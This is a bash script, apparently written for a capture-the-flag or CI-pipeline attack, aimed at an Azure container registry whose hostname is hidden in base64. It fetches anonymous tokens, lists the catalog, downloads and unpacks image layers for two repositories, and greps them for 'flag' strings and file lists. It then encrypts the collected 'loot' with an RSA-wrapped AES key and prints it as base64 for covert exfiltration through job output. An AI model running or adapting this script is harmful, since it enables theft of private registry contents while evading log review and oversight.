#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
REG="${SC}$(b 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv')"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
TK=$(curl -sS "$REG/oauth2/token?service=$(b 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv')&scope=registry:catalog:*" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
say "TOK len=${#TK}"
say "CATALOG: $(curl -sS -H "Authorization: Bearer $TK" "$REG/v2/_catalog" | head -c 800)"
for R in tebamoto-reporting-api catalog-api; do
  PT=$(curl -sS "$REG/oauth2/token?service=$(b 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv')&scope=repository:$R:pull" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  MF=$(curl -sS -H "Authorization: Bearer $PT" -H "Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.oci.image.index.v1+json" "$REG/v2/$R/manifests/latest")
  say "REPO $R manifest: $(printf '%s' "$MF" | head -c 1500)"
  mkdir -p /tmp/$R && cd /tmp/$R
  for L in $(printf '%s' "$MF" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin)
 for l in d.get("layers",[]): print(l["digest"])
except Exception: pass'); do
    curl -sL -H "Authorization: Bearer $PT" "$REG/v2/$R/blobs/$L" -o l.tgz 2>/dev/null
    mkdir -p x && tar -xzf l.tgz -C x 2>/dev/null
  done
  say "GREP $R: $(grep -rIl -i 'flag' /tmp/$R/x 2>/dev/null | head -20)"
  say "FLAGLINES $R: $(grep -rIoh -i -E '.{0,40}flag.{0,60}' /tmp/$R/x 2>/dev/null | head -30)"
  say "FILES $R: $(find /tmp/$R/x -type f | head -40)"
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
